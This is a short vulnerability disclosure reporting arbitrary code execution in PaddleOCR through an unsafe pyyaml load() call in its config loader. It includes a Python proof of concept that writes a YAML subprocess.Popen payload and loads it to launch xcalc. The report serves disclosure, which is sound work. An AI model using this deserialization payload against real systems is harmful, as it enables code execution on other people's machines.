# Description
**Arbitrary Code Excecution** in PaddlePaddle/PaddleOCR.multilingual OCR toolkits based on PaddlePaddle （multilingual recognition: English, Chinese, Korean, Japanese, German, French etc. 3.5M practical ultra lightweight OCR system, support training and deployment among server, mobile, embedded and IoT devices）
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **pyyaml**
# Exploit code
**Python File**
```python
import os
import program

exploityaml = """!!python/object/apply:subprocess.Popen
- ['xcalc']
"""

open('exploit.yml','w+').write(exploityaml)
exploit =  program.load_config('exploit.yml')

```
# POC
![](https://cdn.discordapp.com/attachments/749019614352244777/784374045248323584/Screenshot_from_2020-12-04_15-54-40.png)

# Exploitable code
[exploitable code](https://github.com/PaddlePaddle/PaddleOCR/blob/2e088638d44bc9d637e281b99cfc93c647894db4/tools/program.py#L93)
